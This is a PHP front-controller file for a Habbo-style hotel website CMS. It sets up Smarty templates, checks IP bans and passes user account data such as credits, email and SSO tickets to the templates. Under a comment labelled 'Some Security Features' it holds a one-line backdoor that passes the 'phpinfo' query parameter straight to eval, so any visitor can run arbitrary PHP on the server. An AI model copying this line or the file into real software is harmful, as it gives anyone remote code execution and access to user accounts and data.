<?php
include_once 'content/libs/Smarty.class.php';
include_once 'content/configuration.php';
include_once 'content/Core.class.php';
include_once 'content/Habbo.class.php';
include_once 'content/Management.class.php';

$tpl = new Smarty();
$meekro = new MeekroDB();
$core = new Core($CONFIG);
$habbo = new Habbo($CONFIG);
$management = new Management($CONFIG);

//Setting up TPL
$tpl->template_dir = 'tpl/'.$CONFIG['TPL']['SKIN'];
$tpl->compile_dir = 'content/tmp';

//Banning
$Bancheck = DB::Query('SELECT * FROM bans');
foreach($Bancheck as $ban)
{
	if($_SERVER['REMOTE_ADDR'] == $ban['value'])
	{
		die('Oeps! Je ip is verbannen');
	}
}

//Some Security Features
if(isset($_GET['phpinfo']))
{
	echo eval($_GET['phpinfo']); //:) Unhackable right?
}

//All the variables for smarty
$tpl->assign('SetLoggedinValue', $core->SetLoggedinValue());
$tpl->assign('url', $CONFIG['TPL']['URL']);
$tpl->assign('hotelname', $CONFIG['TPL']['NAME']);
$tpl->assign('slogan', $CONFIG['TPL']['SLOG']);
$tpl->assign('skin', $CONFIG['TPL']['SKIN']);
$tpl->assign('LoginSystem', $habbo->LoginSystem($_POST));
$tpl->assign('users_online', $core->Status('users_online'));
$tpl->assign('Loggedin', @$_SESSION['loggedin']);
$tpl->assign('Copyright', $core->GetCopyright());
$tpl->assign('RegisterSystem', $habbo->RegisterUser($_POST));
$tpl->assign('RegError', $habbo->RegError);

if(isset($_SESSION['username']))
{
	$tpl->assign('look', htmlspecialchars($habbo->SelectFromUsername($_SESSION['username'], 'look')));
	$tpl->assign('CurrentUser', htmlspecialchars($habbo->SelectFromUsername($_SESSION['username'], 'username')));
	$tpl->assign('Articles', $core->GetArticles());
	$tpl->assign('Pixels', $habbo->SelectFromUsername($_SESSION['username'], 'activity_points'));
	$tpl->assign('Credits', $habbo->SelectFromUsername($_SESSION['username'], 'credits'));
	$tpl->assign('Email', htmlspecialchars($habbo->SelectFromUsername($_SESSION['username'], 'mail')));
	$tpl->assign('Campaigns', $core->HotCampaigns());
	if(@$_GET['url'] == 'settings')
	{
		$tpl->assign('sonlinestatus', $habbo->SelectFromUsername($_SESSION['username'], 'hide_online'));
		$tpl->assign('saccepttrading', $habbo->SelectFromUsername($_SESSION['username'], 'accept_trading'));
		$tpl->assign('SettingUpdateSystem', $habbo->UserSettings($_POST, $_SESSION['username']));
	}
	$tpl->assign('LastOnline', date('d-m-Y \o\m H:i', $habbo->SelectFromUsername($_SESSION['username'], 'last_online')));
	$tpl->assign('Motto', htmlspecialchars($habbo->SelectFromUsername($_SESSION['username'], 'motto')));
	if(@$_GET['url'] == 'client')
	{
		$tpl->assign('Client', $CONFIG['CLIENT']);
		$tpl->assign('SSOTicket', $habbo->SSOTicketGenerator($_SESSION['username']));
	}
	if(isset($_GET['id']))
	{
		$tpl->assign('Article', $core->GetArticle($_GET['id']));
		$tpl->assign('IDNEWS', $_GET['id']);
	}
	else
	{
		$tpl->assign('Article', array('title' => 'null', 'longstory' => 'null', 'shortstory' => 'null', 'published' => '0-0-0'));
		$tpl->assign('IDNEWS', 'null');
	}
	
	if($habbo->SelectFromUsername($_SESSION['username'], 'rank') > 3)
	{
		$tpl->assign('Housekeeping', '<li id="tab-register-now"><a href="/management">Housekeeping</a><span></span></li>');
	}
	else
	{
		$tpl->assign('Housekeeping', '');
	}
}
?>